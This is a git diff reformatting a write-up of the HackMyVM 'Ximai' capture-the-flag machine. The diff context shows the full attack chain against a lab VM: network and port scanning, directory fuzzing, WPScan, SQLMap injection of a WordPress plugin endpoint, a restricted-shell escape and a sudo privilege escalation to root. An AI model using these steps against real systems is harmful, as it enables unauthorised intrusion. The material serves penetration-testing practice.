@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Ximai 
+---
+icon: linux
+---
 
-**Platform:** HackMyVM  
-**Operating System:** Linux  
+# Ximai ​​
+
+## 🖥️ Writeup - Ximai
+
+**Platform:** HackMyVM\
+**Operating System:** Linux
 
 > **Tags:** `Linux` `WordPress` `WPScan` `SQLi` `SQLMap` `File Read` `Restricted Shell` `Sudoers` `Writable Binary`
 
-# INSTALLATION
+## INSTALLATION
 
 We download the `zip` containing the `.ova` of the Ximai machine, extract it, and import it into VirtualBox.
 
 We configure the network interface of the Ximai machine and run it alongside the attacker machine.
 
-# HOST DISCOVERY
+## HOST DISCOVERY
 
 At this point, we still don’t know which `IP` address is assigned to Ximai, so we discover it as follows:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,22 +38,24 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:05:fa:12      1      60  PCS Systemtechnik GmbH      
  10.0.4.26       08:00:27:ab:56:1b      1      60  PCS Systemtechnik GmbH
- ```
+```
 
- We identify with high confidence that the victim’s IP is `10.0.4.26`.
+We identify with high confidence that the victim’s IP is `10.0.4.26`.
 
-# PORT SCANNING
+## PORT SCANNING
 
 Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.26
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80,3306,8000 --min-rate 5000 10.0.4.26
 ```
+
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 17:51 CEST
 Nmap scan report for 10.0.4.26
@@ -73,12 +83,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 13.59 seconds
 ```
 
-
 The scan revealed the following open ports: `22`, `80`, `3306`, and `8000`.
 
 We access port `80` and find the default Apache landing page.
 
-# GOBUSTER
+## GOBUSTER
 
 Next, we perform directory `fuzzing` to discover hidden paths and files.
 
@@ -87,6 +96,7 @@ gobuster dir -u http://10.0.4.26 -w /usr/share/seclists/Discovery/Web-Content/di
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -111,11 +121,11 @@ Progress: 1183407 / 1543899 (76.65%)
 
 We discover two hidden files; one is `info.php`, which could reveal server configuration, but for now we focus on `reminder.php`.
 
-![alt text](../../images/ximai.png)
+![alt text](../../.gitbook/assets/ximai.png)
 
 We open `reminder.php` and see a page that states someone left a `.txt` file containing Jimmy’s credentials, but the page does not reveal its location.
 
-We inspect the page source: 
+We inspect the page source:
 
 ```
 <p class="hint-text">
@@ -125,12 +135,11 @@ We inspect the page source:
         <img src="that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg" alt="Mysterious Image">
 ```
 
-We find that the cat image path is very suspicious and matches the directory referenced as containing the credentials.
-Next, we attempt to navigate manually to likely filenames such as `credentials.txt`, `creds.txt`, or `access.txt`.
+We find that the cat image path is very suspicious and matches the directory referenced as containing the credentials. Next, we attempt to navigate manually to likely filenames such as `credentials.txt`, `creds.txt`, or `access.txt`.
 
-We eventually find a match: 
+We eventually find a match:
 
-![alt text](../../images/ximai2.png)
+![alt text](../../.gitbook/assets/ximai2.png)
 
 There is a `symlink` pointing to `/etc/jimmy.txt`, and we cannot read the file.
 
@@ -138,10 +147,9 @@ We cannot progress further here, so we inspect the `WordPress` instance running 
 
 There, we find a message indicating `MySQL` allows local file access, suggesting the database could be abused to read local files, potentially via one of the installed WordPress `plugins`.
 
-![alt text](../../images/ximai3.png)
+![alt text](../../.gitbook/assets/ximai3.png)
 
-
-# WPSCAN
+## WPSCAN
 
 We use `wpscan` to enumerate `users` and `plugins`, passing an `API token` so it reports known vulnerabilities.
 
@@ -150,6 +158,7 @@ wpscan --url http://10.0.4.26:8000 --api-token "srCmCxxxxxxxxuzYle5k" --enumerat
 ```
 
 Info:
+
 ```
 [!] 1 vulnerability identified:
 
@@ -176,6 +185,7 @@ sqlmap -u "http://10.0.4.26:8000/wp-admin/admin-ajax.php?s=test&action=depicter-
 ```
 
 Info:
+
 ```
 GET parameter 's' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
 sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
@@ -206,13 +216,14 @@ That is most likely the `password` for the user `jimmy`.
 
 Next, we log in via `SSH`.
 
-# PRIVLEGE ESCALATION
+## PRIVLEGE ESCALATION
 
 Inside, when we attempt to run commands like `ls` or `sudo -l`, we see the following message:
 
 ```
 sorry, you are restricted from using this command.
 ```
+
 After a few minutes with no clear direction, we check the `$PATH`:
 
 ```
@@ -232,7 +243,7 @@ In Jimmy’s home directory we find the `user flag`.
 
 ```
 flag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}
-``` 
+```
 
 Next, we continue enumeration and locate `wp-config.php` in `/var/www/wordpress/`.
 
@@ -262,7 +273,7 @@ We read `wp-config.php` and find the following:
  */
 ```
 
-We find a comment in `wp-config.php` containing the credentials for the user `adminer`  that we discovered earlier with `wpscan`. 
+We find a comment in `wp-config.php` containing the credentials for the user `adminer` that we discovered earlier with `wpscan`.
 
 Naturally, we test those credentials and log in.
 
@@ -271,6 +282,7 @@ su adminer
 ```
 
 Info:
+
 ```
 adminer@Ximai:/var/www/wordpress$ whoami
 adminer
@@ -283,6 +295,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for adminer on Ximai:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -300,6 +313,7 @@ sudo /usr/bin/grep
 ```
 
 Info:
+
 ```
 bash-5.0# whoami
 root
